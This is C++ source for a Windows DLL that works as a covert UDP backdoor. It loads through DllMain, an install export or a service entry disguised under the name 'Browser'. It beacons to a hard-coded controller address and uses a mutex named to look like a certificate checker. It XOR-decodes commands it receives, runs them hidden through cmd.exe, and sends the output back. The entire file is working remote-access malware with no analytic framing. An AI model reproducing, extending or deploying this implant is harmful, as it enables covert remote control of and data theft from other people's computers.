#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <process.h>
#include <algorithm>
#define _WINSOCKAPI_
#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <string>
#include <fstream>
#include <stdexcept>

#include "up_dll.h"

using namespace std;

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")

#define DEFAULT_BUFLEN 16384
#define CRYPT

struct cmdcall {
	std::string cmd;
	std::string pwd;
	std::string result;
};

bool execFinished = false;

std::string key = "blarknob";

void crypt(std::string &m) {
	for (std::string::size_type i = 0; i < m.length(); i++) {
		m[i] ^= key[i % key.length()];
	}
}

int getLastOctet()
{
	char szBuffer[1024];
	WSADATA wsaData;
	WORD wVersionRequested = MAKEWORD(2, 0);
	if (WSAStartup(wVersionRequested, &wsaData) != 0)
		return 0;

	if (gethostname(szBuffer, sizeof(szBuffer)) == SOCKET_ERROR)
	{
		WSACleanup();
		return 0;
	}

	struct hostent *host = gethostbyname(szBuffer);
	if (host == NULL)
	{
		WSACleanup();
		return 0;
	}

	int last_octet = ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b3 * 10;
	last_octet += ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b4;

	WSACleanup();
	return last_octet;
}

void exec2(cmdcall *p)
{
	cmdcall *args = NULL;
	args = (cmdcall *)p;
	args->cmd = "cmd.exe /c " + args->cmd + " & echo **SS** & cd";
	HANDLE stdOutHandles[2];
	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	if (!CreatePipe(&stdOutHandles[0], &stdOutHandles[1], &saAttr, 65535))
	{
		execFinished = true;
		return;
	}
	PROCESS_INFORMATION pInfo;
	ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
	STARTUPINFO startInfo;
	ZeroMemory(&startInfo, sizeof(STARTUPINFO));
	startInfo.cb = sizeof(STARTUPINFO);
	startInfo.hStdOutput = stdOutHandles[1];
	startInfo.hStdError = stdOutHandles[1];
	startInfo.dwFlags |= STARTF_USESTDHANDLES;// | STARTF_USESHOWWINDOW;
	startInfo.wShowWindow = SW_HIDE;
	wchar_t expandedCmd[MAX_PATH];

	int sz = MultiByteToWideChar(CP_ACP, 0, &args->cmd[0], (int)args->cmd.size(), 0, 0);
	std::wstring wStr(sz, 0);
	MultiByteToWideChar(CP_ACP, 0, &args->cmd[0], (int)args->cmd.size(), &wStr[0], sz);

	sz = MultiByteToWideChar(CP_ACP, 0, &args->pwd[0], (int)args->pwd.size(), 0, 0);
	std::wstring wPwd(sz, 0);
	MultiByteToWideChar(CP_ACP, 0, &args->pwd[0], (int)args->pwd.size(), &wPwd[0], sz);

	ExpandEnvironmentStrings(wStr.c_str(), expandedCmd, MAX_PATH);
	if (!CreateProcess(NULL, expandedCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, wPwd.c_str(), &startInfo, &pInfo))
	{
		CloseHandle(stdOutHandles[0]);
		CloseHandle(stdOutHandles[1]);
		execFinished = true;
		return;
	}
	WaitForSingleObject(pInfo.hProcess, 5000);
	char buffer[65536];
	DWORD readBufferSize;
	BOOL result;
	PeekNamedPipe(stdOutHandles[0], NULL, 0, NULL, &readBufferSize, NULL);
	if (readBufferSize > 0)
	{
		if (readBufferSize > 65535)
			readBufferSize = 65535;
		if ((result = ReadFile(stdOutHandles[0], buffer, readBufferSize, &readBufferSize, NULL)))
		{
			buffer[readBufferSize] = '\0';
			args->result = buffer;
		}
	}
	else
		args->result = "No output from command.\n";
	CloseHandle(stdOutHandles[0]);
	CloseHandle(stdOutHandles[1]);
	CloseHandle(pInfo.hProcess);
	CloseHandle(pInfo.hThread);
	execFinished = true;
	return;
}

std::string ip = "10.5.9.9";
std::string pwd = "c:\\";
bool running = true;

static DWORD WINAPI connector(void *params)
{
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	while (running) {

		HANDLE mut = CreateMutexA(0, FALSE, "Local\\mscrlchecker");
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			Sleep(500);
			if (mut)
				CloseHandle(mut);
			continue;
		}

		WSADATA wsaData;
		SOCKET sock = INVALID_SOCKET;
		SOCKADDR_IN addr;
		int addrLen = sizeof(addr);
		bool ready = false;
		int iResult;
		int nError = 0;

		std::string recvq = "";
		std::string sendq = "";
		u_long noblock = 1;
		u_long block = 1;

		// wsastartup
		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (iResult != 0)
		{
			continue;
		}

		int port = 58800 + getLastOctet();
		addr.sin_family = AF_INET;
		addr.sin_port = htons(port);
		addr.sin_addr.S_un.S_addr = inet_addr(ip.c_str());

		// create a socket for connecting to server
		sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (sock == INVALID_SOCKET) {
			closesocket(sock);
			WSACleanup();
			continue;
		}

		// make socket non-blocking
		iResult = ioctlsocket(sock, FIONBIO, &noblock);
		if (iResult == SOCKET_ERROR) {
			closesocket(sock);
			WSACleanup();
			continue;
		}

		DWORD lastBeacon = 0;
		ready = true;
		while (running && ready) {
			if (sendq.length() == 0 && GetTickCount() - lastBeacon > 10000) {
				lastBeacon = GetTickCount();
				sendq = "<<CRLCHK>>";
			}
			// send anything queued
			if (sendq.length() > 0) {
#ifdef CRYPT
				crypt(sendq);
#endif
				while (running && ready && sendq.length() > 0)
				{
					lastBeacon = GetTickCount();
					if (sendq.length() > 1400)
					{
						std::string t_msg = sendq.substr(0, 1400);
						sendq = sendq.substr(1400);
						iResult = sendto(sock, t_msg.c_str(), t_msg.length(), 0, (sockaddr*)&addr, sizeof(addr));
						if (iResult <= 0) {
							closesocket(sock);
							WSACleanup();
							ready = false;
							break;
						}
					}
					else if (sendq.length() > 0)
					{
						iResult = sendto(sock, sendq.c_str(), sendq.length(), 0, (sockaddr*)&addr, sizeof(addr));
						sendq = sendq.substr(iResult);
						if (iResult <= 0) {
							closesocket(sock);
							WSACleanup();
							ready = false;
							break;
						}
					}
				}
			}
			// get new stuff
			iResult = recvfrom(sock, recvbuf, recvbuflen, 0, (sockaddr*)&addr, &addrLen);
			if (iResult > 0)
			{
				recvbuf[iResult] = '\0';
				recvq = recvbuf;
			}
			else
				recvq = "";

			// do something
			if (recvq.length() > 0) {
				cmdcall args;
				args.cmd = recvq.substr(0, recvq.find("\n"));
#ifdef CRYPT
				crypt(args.cmd);
#endif
				args.pwd = pwd;
				recvq = recvq.substr(recvq.find("\n") + 1, recvq.length() - (recvq.find("\n") + 1));
				_beginthread((void(*)(void*))exec2, 0, (void *)&args);
				execFinished = false;
				while (running && ready && !execFinished) {
					Sleep(50);
				};
				std::string msg;
				int q = args.result.find("**SS**");
				if (q >= 0)
				{
					if (q > 0)
						msg = args.result.substr(0, args.result.find("**SS**") - 2);
					else
						msg = "";
					sendq += msg + "\n";
					pwd = args.result.substr(args.result.find("**SS**") + 9, args.result.length() - args.result.find("**SS**") - 11);
					sendq += pwd + "\n";
				}
				else
					sendq += args.result + "\n";
			}
			Sleep(100);
		}
		CloseHandle(mut);
	}
	return 1;
}

extern "C" __declspec(dllexport) int install()
{
	HANDLE hThread = CreateThread(NULL, 0, connector, 0, 0, NULL);
	if (hThread) {
		CloseHandle(hThread);
	}
	return 1;
}

extern "C" __declspec(dllexport) BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		install();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

SERVICE_STATUS_HANDLE g_serviceStatusHandle = nullptr;

SERVICE_STATUS g_serviceStatus =
{
	SERVICE_WIN32_SHARE_PROCESS, SERVICE_START_PENDING,	SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE
};

DWORD WINAPI HandlerEx(
	DWORD dwControl,
	DWORD dwEventType,
	LPVOID lpEventData,
	LPVOID lpContext
)
{
	switch (dwControl)
	{
	case SERVICE_CONTROL_STOP:
	case SERVICE_CONTROL_SHUTDOWN:
		g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_PAUSE:
		g_serviceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		g_serviceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	};

	SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);

	return NO_ERROR;
}

extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD dwArgc, LPCWSTR* lpszArgv) {
	g_serviceStatusHandle = RegisterServiceCtrlHandlerExW(L"Browser", HandlerEx, nullptr);
	if (!g_serviceStatusHandle)
	{
		return;
	}

	g_serviceStatus.dwCurrentState = SERVICE_RUNNING;

	SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);

	HANDLE hThread = CreateThread(NULL, 0, connector, 0, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
}

